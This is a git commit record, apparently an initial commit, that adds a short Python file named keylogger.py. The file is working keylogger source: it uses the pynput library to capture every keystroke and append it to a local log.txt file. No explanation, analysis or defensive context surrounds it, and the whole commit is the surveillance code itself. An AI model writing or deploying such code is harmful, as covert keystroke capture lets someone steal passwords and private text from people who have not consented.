999b8554016358efd0fea9256f1e02bc0a1dbab4
mtec <mtec@kali.pb5.org>
2024-06-19 18:42:41 +0100

    Initial commit

---
+++ keylogger.py
@@ -0,0 +1,11 @@
+from pynput.keyboard import Listener
+
+def on_press(key):
+    with open('log.txt', 'a') as f:
+        f.write(str(key))
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
